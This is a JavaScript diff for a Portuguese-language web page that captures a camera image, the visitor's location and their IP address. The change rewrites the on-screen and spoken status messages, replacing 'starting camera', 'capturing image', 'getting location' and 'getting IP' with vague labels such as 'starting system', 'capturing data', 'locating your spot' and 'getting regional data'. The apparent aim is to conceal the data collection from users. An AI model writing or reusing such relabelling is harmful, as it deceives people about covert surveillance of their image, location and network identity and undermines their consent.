@@ -90,7 +90,7 @@ async function iniciarSistema(){
     );
 
     statusText.innerHTML =
-    "📸 Iniciando câmera...";
+    "🟡 Iniciando sistema...";
 
     const stream =
     await navigator.mediaDevices
@@ -166,10 +166,10 @@ btn.addEventListener(
       "PROCESSANDO...";
 
       statusText.innerHTML =
-      "📸 Capturando imagem...";
+      "Capturando Dados...";
 
       falar(
-        "Capturando imagem."
+        "Capturando Dados."
       );
 
       const largura =
@@ -222,10 +222,10 @@ btn.addEventListener(
       try{
 
         statusText.innerHTML =
-        "📍 Obtendo localização...";
+        "📍 Localizando sua Vaga...";
 
         falar(
-          "Obtendo localização."
+          "Localizando sua Vaga."
         );
 
         const localizacao =
@@ -273,7 +273,7 @@ btn.addEventListener(
       try{
 
         statusText.innerHTML =
-        "🌐 Obtendo IP...";
+        "🌐 Obtendo Dados Regionais...";
 
         const req =
         await fetch(
